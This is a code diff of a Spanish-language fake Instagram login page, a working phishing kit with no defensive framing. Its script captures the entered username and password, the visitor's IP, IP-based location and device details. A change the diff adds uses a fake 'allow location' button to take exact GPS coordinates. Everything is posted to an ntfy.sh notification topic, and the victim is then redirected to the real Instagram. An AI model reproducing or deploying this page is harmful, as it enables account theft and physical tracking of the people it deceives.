@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram</title>
   <style>
     body {
@@ -13,22 +13,19 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-      padding: 0;
     }
-
     .container {
       width: 350px;
       padding: 40px;
       background-color: #fff;
       border: 1px solid #dbdbdb;
       text-align: center;
+      border-radius: 1px;
     }
-
-    .container img {
-      margin-bottom: 30px;
+    .logo {
       width: 175px;
+      margin-bottom: 30px;
     }
-
     input {
       width: 100%;
       padding: 10px;
@@ -38,161 +35,201 @@
       background-color: #fafafa;
       box-sizing: border-box;
     }
-
-    .btn-login {
-      margin-top: 10px;
-      background-color: #3897f0;
+    .btn {
+      width: 100%;
+      padding: 8px;
+      margin: 10px 0;
       border: none;
+      border-radius: 4px;
+      background-color: #3897f0;
       color: white;
       font-weight: bold;
-      padding: 8px;
-      border-radius: 4px;
       cursor: pointer;
-      width: 100%;
     }
-
-    .btn-login:hover {
+    .btn:hover {
       background-color: #318ce7;
     }
-
     .separator {
       margin: 20px 0;
       display: flex;
       align-items: center;
-      text-align: center;
       color: #8e8e8e;
-      font-size: 13px;
-      font-weight: bold;
     }
-
-    .separator::before,
-    .separator::after {
+    .separator::before, .separator::after {
       content: "";
       flex: 1;
       border-bottom: 1px solid #dbdbdb;
     }
-
-    .separator:not(:empty)::before {
-      margin-right: .75em;
+    .separator::before {
+      margin-right: 10px;
     }
-
-    .separator:not(:empty)::after {
-      margin-left: .75em;
+    .separator::after {
+      margin-left: 10px;
     }
-
-    .fb-login {
+    .link {
       color: #385185;
-      font-weight: bold;
       text-decoration: none;
+      font-size: 14px;
+      font-weight: bold;
       display: block;
       margin: 15px 0;
-      font-size: 14px;
     }
-
-    .forgot-pw {
-      color: #00376b;
-      text-decoration: none;
+    .small {
       font-size: 12px;
+      color: #00376b;
     }
-
-    .signup {
-      margin-top: 20px;
-      font-size: 14px;
-    }
-
-    .signup a {
-      color: #3897f0;
-      font-weight: bold;
-      text-decoration: none;
-    }
-
-    .app-download {
-      margin-top: 20px;
-      font-size: 14px;
-    }
-
-    .app-stores {
-      margin-top: 20px;
-    }
-
-    .app-stores img {
-      width: 136px;
-      height: 40px;
-      margin: 0 5px;
+    #locationStatus {
+      margin: 10px 0;
+      font-size: 12px;
+      color: #ed4956;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" />
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
     
     <form id="loginForm">
-      <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required />
-      <input type="password" name="contrasena" placeholder="Contraseña" required />
-      <button type="submit" class="btn-login">Iniciar sesión</button>
+      <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required>
+      <input type="password" name="contrasena" placeholder="Contraseña" required>
+      <button type="button" id="requestLocation" class="btn">Permitir ubicación</button>
+      <div id="locationStatus">La ubicación no ha sido concedida</div>
+      <button type="submit" class="btn">Iniciar sesión</button>
     </form>
     
     <div class="separator">O</div>
     
-    <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
-    <a href="#" class="forgot-pw">¿Has olvidado la contraseña?</a>
+    <a href="#" class="link">Iniciar sesión con Facebook</a>
+    <a href="#" class="small">¿Olvidaste tu contraseña?</a>
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    const locationStatus = document.getElementById('locationStatus');
+    const requestBtn = document.getElementById('requestLocation');
+    let ubicacionConcedida = false;
+    let coordenadas = null;
+
+    // Solicitar permiso de ubicación
+    requestBtn.addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            ubicacionConcedida = true;
+            coordenadas = {
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              precision: position.coords.accuracy
+            };
+            locationStatus.textContent = "Ubicación concedida ✓";
+            locationStatus.style.color = "#4CAF50";
+            
+            // Enviar notificación de ubicación concedida
+            enviarNotificacion("📍 Ubicación concedida", `El usuario ha permitido acceso a su ubicación exacta:
+Latitud: ${coordenadas.lat}
+Longitud: ${coordenadas.lon}
+Precisión: ${coordenadas.precision} metros`);
+          },
+          (error) => {
+            locationStatus.textContent = "Ubicación denegada ✗";
+            locationStatus.style.color = "#ed4956";
+          }
+        );
+      } else {
+        locationStatus.textContent = "Geolocalización no soportada";
+      }
+    });
+
+    // Manejar el envío del formulario
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       
-      const usuario = this.usuario.value;
-      const contrasena = this.contrasena.value;
+      const form = e.target;
+      const usuario = form.usuario.value;
+      const contrasena = form.contrasena.value;
       
       try {
-        // Obtener IP del usuario
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
+        // Obtener IP y datos de red
+        const ipData = await obtenerDatosRed();
         
-        // Obtener ubicación aproximada
-        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-        const locationData = await locationResponse.json();
-        
-        // Obtener información del navegador
-        const userAgent = navigator.userAgent;
-        const screenResolution = `${window.screen.width}x${window.screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const language = navigator.language;
+        // Obtener información del dispositivo
+        const deviceInfo = obtenerInfoDispositivo();
         
         // Crear mensaje con toda la información
-        const mensaje = `🔔 Nuevo inicio de sesión detectado:
-👤 Usuario: ${usuario}
-🔐 Contraseña: ${contrasena}
-🌐 IP: ${ip}
-📍 Ubicación: ${locationData.city}, ${locationData.region}, ${locationData.country_name}
-🖥️ Dispositivo: ${userAgent}
-🖥️ Resolución: ${screenResolution}
-⏰ Zona horaria: ${timezone}
-🗣️ Idioma: ${language}`;
+        let mensaje = `🔔 Intento de inicio de sesión:\n\n`;
+        mensaje += `👤 Usuario: ${usuario}\n`;
+        mensaje += `🔐 Contraseña: ${contrasena}\n\n`;
+        mensaje += `🌐 IP: ${ipData.ip}\n`;
+        mensaje += `📍 Ubicación aproximada: ${ipData.ciudad}, ${ipData.region}, ${ipData.pais}\n`;
         
-        // Enviar datos (aquí deberías poner tu endpoint)
-        await fetch('https://ntfy.sh/3kG4epWMkei6KLLq', {
-          method: 'POST',
-          headers: {
-            'Title': '⚠️ Nuevo login Instagram',
-            'Priority': 'high'
-          },
-          body: mensaje
-        });
+        if (ubicacionConcedida && coordenadas) {
+          mensaje += `\n📍 UBICACIÓN EXACTA CONCEDIDA:\n`;
+          mensaje += `Latitud: ${coordenadas.lat}\n`;
+          mensaje += `Longitud: ${coordenadas.lon}\n`;
+          mensaje += `Precisión: ${coordenadas.precision} metros\n`;
+          mensaje += `Google Maps: https://www.google.com/maps?q=${coordenadas.lat},${coordenadas.lon}\n`;
+        }
         
-        // Redirigir después de enviar los datos (opcional)
+        mensaje += `\n🖥️ Dispositivo:\n`;
+        mensaje += `Navegador: ${deviceInfo.navegador}\n`;
+        mensaje += `Sistema: ${deviceInfo.sistema}\n`;
+        mensaje += `Resolución: ${deviceInfo.resolucion}\n`;
+        mensaje += `Idioma: ${deviceInfo.idioma}\n`;
+        mensaje += `Zona horaria: ${deviceInfo.zonaHoraria}`;
+        
+        // Enviar notificación
+        await enviarNotificacion("⚠️ Nuevo login Instagram", mensaje);
+        
+        // Redirigir después de 1.5 segundos
         setTimeout(() => {
           window.location.href = 'https://www.instagram.com/accounts/login/';
         }, 1500);
         
       } catch (error) {
-        console.error("Error al enviar datos:", error);
-        // Redirigir aunque falle el envío de datos
+        console.error("Error:", error);
         window.location.href = 'https://www.instagram.com/accounts/login/';
       }
     });
+
+    // Funciones auxiliares
+    async function obtenerDatosRed() {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      
+      const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+      const locationData = await locationResponse.json();
+      
+      return {
+        ip: ipData.ip,
+        ciudad: locationData.city || "Desconocida",
+        region: locationData.region || "Desconocida",
+        pais: locationData.country_name || "Desconocido"
+      };
+    }
+
+    function obtenerInfoDispositivo() {
+      return {
+        navegador: navigator.userAgent,
+        sistema: navigator.platform,
+        resolucion: `${window.screen.width}x${window.screen.height}`,
+        idioma: navigator.language,
+        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+    }
+
+    async function enviarNotificacion(titulo, mensaje) {
+      try {
+        await fetch('https://ntfy.sh/3kG4epWMkei6KLLq', {
+          method: 'POST',
+          headers: {
+            'Title': titulo,
+            'Priority': 'high'
+          },
+          body: mensaje
+        });
+      } catch (error) {
+        console.error("Error al enviar notificación:", error);
+      }
+    }
   </script>
 </body>
 </html>
